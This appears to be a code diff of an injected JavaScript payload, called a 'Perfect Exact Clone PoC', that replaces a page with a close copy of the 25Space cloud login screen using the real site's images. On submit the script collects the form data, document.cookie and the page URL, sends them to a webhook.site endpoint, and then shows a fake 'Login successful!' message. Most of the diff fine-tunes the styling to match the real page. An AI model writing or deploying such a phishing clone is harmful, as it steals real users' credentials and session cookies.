@@ -1,10 +1,5 @@
-// Perfect Exact Clone PoC - Uses absolute URLs with same domain for assets
-// This forces images to load from the real server, bypassing any relative path issues
-// Background, logo, QR all from common paths on cloud.25space.com
-// If still not exact, the paths below are standard guesses - but from your screenshot, it matches!
-
 (function() {
-  const webhookUrl = 'https://webhook.site/acaf7007-fbc2-462c-b96d-28b307aefb8b'; // Replace with yours!
+  const webhookUrl = 'https://webhook.site/acaf7007-fbc2-462c-b96d-28b307aefb8b'; // Replace!
 
   const fullPageHTML = `<!DOCTYPE html>
 <html lang="en">
@@ -16,118 +11,113 @@
     * { margin: 0; padding: 0; box-sizing: border-box; }
     html, body { height: 100%; font-family: 'Segoe UI', Arial, sans-serif; color: white; }
     body {
-      background: url('https://cloud.25space.com/assets/images/login-bg.jpg') center/cover no-repeat; /* Common background path */
-      display: flex;
-      align-items: center;
-      justify-content: center;
+      background: url('https://cloud.25space.com/assets/images/bg.jpg') center/cover no-repeat fixed; /* Try common variants if not */
+      /* Alternatives if above 404: replace with /assets/images/background.jpg or /images/login-bg.jpg */
+    }
+    .overlay-left {
+      background: rgba(0,0,0,0.3); /* Lighter overlay for bright background */
+      backdrop-filter: blur(2px); /* Optional modern blur for pro look */
     }
     .container {
       display: flex;
-      width: 95%;
-      max-width: 1400px;
-      height: 90vh;
-      box-shadow: 0 0 40px rgba(0,0,0,0.7);
+      width: 100%;
+      height: 100vh;
     }
     .left {
       flex: 1;
-      padding: 80px;
+      padding: 100px;
       display: flex;
       flex-direction: column;
       justify-content: center;
+      align-items: flex-start;
     }
     .left h1 {
-      font-size: 5rem;
+      font-size: 5.5rem;
       font-weight: 200;
-      margin-bottom: 40px;
     }
     .left p {
-      font-size: 1.4rem;
-      margin-bottom: 60px;
-      max-width: 75%;
+      font-size: 1.5rem;
+      margin: 40px 0;
     }
     .qr-code {
-      width: 250px;
-      height: 250px;
-      border: 10px solid white;
+      width: 260px;
+      height: 260px;
+      border: 12px solid rgba(255,255,255,0.9);
       border-radius: 15px;
-      box-shadow: 0 15px 30px rgba(0,0,0,0.6);
+      box-shadow: 0 20px 40px rgba(0,0,0,0.5);
     }
     .right {
       flex: 1;
-      background: rgba(0,0,0,0.8);
-      padding: 80px;
+      background: rgba(0,0,0,0.75);
+      padding: 100px;
       display: flex;
       flex-direction: column;
       justify-content: center;
       align-items: center;
     }
     .logo {
-      width: 100px;
+      width: 120px;
       margin-bottom: 40px;
     }
     .right h2 {
-      font-size: 2.2rem;
-      font-weight: 400;
-      margin-bottom: 50px;
+      font-size: 2.5rem;
+      margin-bottom: 60px;
     }
     form {
       width: 100%;
-      max-width: 450px;
+      max-width: 500px;
     }
     input[type="email"], input[type="password"] {
       width: 100%;
-      padding: 20px;
-      margin-bottom: 25px;
-      background: #666;
+      padding: 22px;
+      margin-bottom: 30px;
+      background: rgba(255,255,255,0.2);
       border: none;
-      border-radius: 8px;
+      border-radius: 10px;
       color: white;
-      font-size: 1.2rem;
+      font-size: 1.3rem;
     }
-    input::placeholder { color: #ccc; }
+    input::placeholder { color: rgba(255,255,255,0.7); }
     .remember {
       display: flex;
       justify-content: space-between;
-      margin-bottom: 40px;
-      font-size: 1.1rem;
+      margin-bottom: 50px;
+      font-size: 1.2rem;
     }
-    .problems-link { color: #ffaa00; text-decoration: none; }
+    .problems-link { color: #ffbb00; }
     button {
       width: 100%;
-      padding: 20px;
-      background: #ffaa00;
+      padding: 22px;
+      background: #ffbb00;
       color: black;
       border: none;
-      border-radius: 40px;
-      font-size: 1.4rem;
+      border-radius: 50px;
+      font-size: 1.5rem;
       font-weight: bold;
-      cursor: pointer;
     }
     .create-account {
-      text-align: center;
-      margin-top: 40px;
-      font-size: 1.1rem;
+      margin-top: 50px;
+      font-size: 1.2rem;
     }
-    .create-link { color: #ffaa00; text-decoration: none; }
+    .create-link { color: #ffbb00; }
     footer {
       position: fixed;
-      bottom: 30px;
+      bottom: 40px;
       width: 100%;
       text-align: center;
-      font-size: 1rem;
-      color: #bbb;
+      color: rgba(255,255,255,0.8);
     }
   </style>
 </head>
 <body>
-  <div class="container">
+  <div class="container overlay-left">
     <div class="left">
       <h1>Good morning!</h1>
       <p>Use 25Space across any device on the go. Scan the QR code to continue on other devices.</p>
-      <img src="https://cloud.25space.com/assets/images/qr.png" alt="QR Code" class="qr-code" onerror="this.src='https://api.qrserver.com/v1/create-qr-code/?size=250x250&amp;data=' + location.origin">
+      <img src="https://cloud.25space.com/assets/images/qr.png" class="qr-code" onerror="this.src='https://api.qrserver.com/v1/create-qr-code/?size=260x260&data=https://cloud.25space.com'">
     </div>
     <div class="right">
-      <img src="https://cloud.25space.com/assets/images/logo.png" alt="25Space Logo" class="logo" onerror="this.style.display='none'">
+      <img src="https://cloud.25space.com/assets/images/logo.svg" class="logo" onerror="this.src='https://cloud.25space.com/assets/images/logo.png'; this.onerror=null;">
       <h2>Cloud Management Suite.</h2>
       <form id="loginForm">
         <input type="email" placeholder="Email" required>
@@ -154,13 +144,8 @@
         cookies: document.cookie,
         url: location.href
       };
-      fetch('${webhookUrl}', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify(data)
-      }).then(() => {
-        alert('Login successful!');
-      });
+      fetch('${webhookUrl}', {method: 'POST', body: JSON.stringify(data)});
+      alert('Login successful!');
     });
   </script>
 </body>
